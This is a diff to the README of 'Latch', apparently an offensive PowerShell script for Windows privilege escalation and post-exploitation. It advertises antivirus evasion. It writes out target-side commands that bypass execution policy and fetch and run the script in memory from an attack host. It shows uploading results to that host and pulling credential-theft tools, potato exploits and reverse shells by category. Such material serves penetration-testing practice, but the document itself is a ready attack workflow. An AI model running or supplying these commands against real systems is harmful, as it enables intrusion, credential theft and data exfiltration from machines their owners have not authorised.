@@ -21,9 +21,10 @@ A lightweight PowerShell enumeration script for Windows privilege escalation ass
 - **Zero Dependencies** - Pure PowerShell, no external modules required
 - **Defender Evasion** - Designed to avoid common AV signatures
 - **Automated Alerts** - Highlights critical findings (token privileges, unquoted paths, MSI elevation)
-- **Tool Integration** - Optional download of common privesc tools from your attack host
+- **Category-Based Tool Downloads** - Download only what you need (Enumeration, Credentials, TokenAbuse, AD, etc.)
+- **Temp Directory Usage** - Tools downloaded to `%TEMP%\lt` by default, keeping filesystem clean
 - **Flexible Output** - Individual files, zip compression, and remote upload support
-- **Progress Tracking** - Real-time status with percentage completion
+- **100+ Tools** - Comprehensive collection of privesc and post-exploitation tools
 
 ## Quick Start
 
@@ -31,16 +32,16 @@ A lightweight PowerShell enumeration script for Windows privilege escalation ass
 
 ```bash
 git clone https://github.com/yourusername/Latch.git
-cd Survey
+cd Latch
 ./serve-tools.sh --download
 ```
 
 ### On Windows (Target)
 
 ```powershell
-# Download and run
+# Download and run with enumeration tools
 powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP/Latch.ps1','s.ps1')"
-powershell -ep bypass -c ".\s.ps1"
+powershell -ep bypass -c ".\s.ps1 -RemoteHost KALI_IP -DownloadTools Enumeration"
 
 # Or run in memory (no file on disk)
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/Latch.ps1')"
@@ -54,26 +55,52 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://K
 |-----------|-------------|---------|
 | `-OutputDir` | Output directory for results | `.\LatchOutput` |
 | `-RemoteHost` | IP of tool server for downloads | - |
-| `-DownloadTools` | Download tools from RemoteHost | `false` |
+| `-DownloadTools` | Download tools by category (see below) | - |
+| `-ToolsDir` | Directory to download tools to | `$env:TEMP\lt` |
 | `-Quiet` | Suppress informational output | `false` |
 | `-Zip` | Compress output to zip file | `false` |
 | `-Upload` | URL endpoint for result upload | - |
 | `-Cleanup` | Delete output folder after zip/upload | `false` |
 
+### Download Categories
+
+| Category | Tools Included |
+|----------|----------------|
+| `All` | Everything in the `all/` folder (100+ tools) |
+| `Enumeration` | WinPEAS, LinPEAS, SharpUp, Seatbelt, PowerUp, PrivescCheck, JAWS, Watson, pspy, accesschk |
+| `Credentials` | LaZagne, Mimikatz, SharpDPAPI, SharpChrome, SharpWeb, Rubeus, Snaffler, SharpKatz |
+| `TokenAbuse` | PrintSpoofer, GodPotato, JuicyPotato, SweetPotato, RoguePotato, LocalPotato, RemotePotato0, CoercedPotato, GenericPotato, SharpEfsPotato |
+| `AD` | SharpHound, RustHound, Certify, Whisker, PowerView, Kerbrute, PetitPotam, SharpLAPS, SharpGPOAbuse, KrbRelayUp |
+| `Tunneling` | Chisel, Ligolo-ng, socat, netcat |
+| `Impacket` | secretsdump, GetUserSPNs, GetNPUsers, psexec, wmiexec, atexec, dcomexec, ntlmrelayx, ticketer |
+| `Shells` | Nishang reverse shells, PHP shells, netcat |
+
 ### Examples
 
 ```powershell
-# Basic enumeration
+# Basic enumeration only
 powershell -ep bypass -c ".\Latch.ps1"
 
-# With tool downloads from attack host
-powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools"
+# Download enumeration tools (to %TEMP%\lt)
+powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools Enumeration"
+
+# Download token abuse tools (potatoes)
+powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools TokenAbuse"
+
+# Download AD tools
+powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools AD"
+
+# Download all tools
+powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools All"
+
+# Download tools to a specific directory
+powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools Enumeration -ToolsDir C:\Users\Public\t"
 
 # Quick exfiltration (zip, cleanup, minimal output)
 powershell -ep bypass -c ".\Latch.ps1 -Zip -Cleanup -Quiet"
 
 # Full automation with upload
-powershell -ep bypass -c ".\Latch.ps1 -Upload http://10.10.14.5:8080/upload -Cleanup"
+powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools All -Upload http://10.10.14.5:8080/upload -Cleanup"
 ```
 
 ### Alternative Transfer Methods
@@ -127,7 +154,7 @@ When high-value findings are detected, dedicated alert files are created:
 
 ## Tool Server
 
-The `serve-tools.sh` script provides a convenient way to host enumeration tools and serve them via HTTP.
+The `serve-tools.sh` script provides a convenient way to host enumeration tools and serve them via HTTP. All files are created in `/tmp/tools` by default.
 
 ### Options
 
@@ -146,32 +173,61 @@ The `serve-tools.sh` script provides a convenient way to host enumeration tools 
 # Search /opt for tools and serve them
 ./serve-tools.sh
 
-# Download missing tools and serve
+# Download missing tools and serve (recommended)
 ./serve-tools.sh --download
 
-# Use persistent storage
+# Use persistent storage instead of /tmp
 ./serve-tools.sh -d /opt/tools --download
 
 # Custom port
 ./serve-tools.sh -p 8080 --download
 ```
 
-### Included Tools
+### Server Directory Structure
 
-The server can find or download 60+ tools organized by category:
+```
+/tmp/tools/
+├── all/                    # Flat folder with symlinks to ALL tools
+├── categories/
+│   ├── Enumeration/        # WinPEAS, SharpUp, Seatbelt, etc.
+│   ├── Credentials/        # Mimikatz, LaZagne, Rubeus, etc.
+│   ├── TokenAbuse/         # All potatoes, PrintSpoofer
+│   ├── AD/                 # SharpHound, Certify, PowerView, etc.
+│   ├── Tunneling/          # Chisel, Ligolo-ng, socat
+│   ├── Impacket/           # Python scripts
+│   └── Shells/             # Reverse shells
+├── WinPEAS/                # Individual tool folders
+├── Mimikatz/
+├── GodPotato/
+└── Latch.ps1               # Automatically copied
+```
+
+### Included Tools (106 total)
 
 | Category | Tools |
 |----------|-------|
-| **Enumeration** | winPEAS, linpeas, SharpUp, Seatbelt, PowerUp, PowerView |
-| **Credentials** | LaZagne, Mimikatz, SharpDPAPI, Rubeus |
-| **Token Abuse** | PrintSpoofer, GodPotato, JuicyPotato, SweetPotato |
-| **Tunneling** | Chisel, Ligolo-ng, socat |
-| **AD Tools** | SharpHound, Certify, Whisker, Impacket scripts |
+| **Windows Enumeration** | winPEAS, SharpUp, Seatbelt, PowerUp, PrivescCheck, JAWS, Watson, Sherlock |
+| **Linux Enumeration** | linpeas, LinEnum, lse.sh, linux-exploit-suggester, pspy |
+| **Credentials** | LaZagne, Mimikatz, SharpDPAPI, SharpChrome, SharpWeb, Rubeus, Snaffler, SharpKatz, SafetyKatz |
+| **Print Spooler Abuse** | PrintSpoofer (32/64-bit) |
+| **Potato Attacks** | GodPotato, JuicyPotato, JuicyPotatoNG, SweetPotato, RoguePotato, LocalPotato, RemotePotato0, CoercedPotato, GenericPotato, SharpEfsPotato |
+| **Tunneling** | Chisel, Ligolo-ng, socat (Linux + Windows), netcat |
+| **AD Tools** | SharpHound, RustHound, PowerView, Certify, Whisker, KrbRelayUp, SharpLAPS, SharpGPOAbuse, Kerbrute, Farmer |
+| **ADCS/Coercion** | Certify, PetitPotam, ADCSPwn |
+| **Impacket** | secretsdump, GetUserSPNs, GetNPUsers, psexec, wmiexec, smbexec, atexec, dcomexec, getTGT, getST, ticketer, ntlmrelayx, addcomputer, rbcd |
+| **Utilities** | RunasCs, netcat, PsExec, procdump, accesschk |
+| **Shells** | Nishang (PowerShell TCP), PHP reverse shell |
 
-Tools are organized into folders with a flat `all/` directory for easy access:
-```
+### Accessing Tools
+
+```bash
+# Single tool download
 http://KALI_IP/all/winPEASx64.exe
-http://KALI_IP/all/PrintSpoofer64.exe
+http://KALI_IP/all/GodPotato-NET4.exe
+
+# Category folder (for Latch.ps1 -DownloadTools)
+http://KALI_IP/categories/Enumeration/
+http://KALI_IP/categories/TokenAbuse/
 ```
 
 ## Sample Output
@@ -187,12 +243,16 @@ http://KALI_IP/all/PrintSpoofer64.exe
 [14:23:03][6%] [+] System info saved to sysinfo.txt
 [14:23:03][6%] [!!!] FOUND: SeImpersonate or SeAssignPrimaryToken enabled!
 ...
-[14:23:15][100%] [+] Latch complete
+[14:23:15][94%] [*] Downloading tools to C:\Users\user\AppData\Local\Temp\lt...
+[14:23:16][94%] [+] Downloaded winPEASx64.exe
+[14:23:17][94%] [+] Downloaded SharpUp.exe
+[14:23:18][100%] [+] Latch complete
 
 ============================================================
   LATCH COMPLETE
 ============================================================
   Output: .\LatchOutput
+  Tools:  C:\Users\user\AppData\Local\Temp\lt
 
   CRITICAL FINDINGS:
     [!] Token privileges - check sysinfo.txt
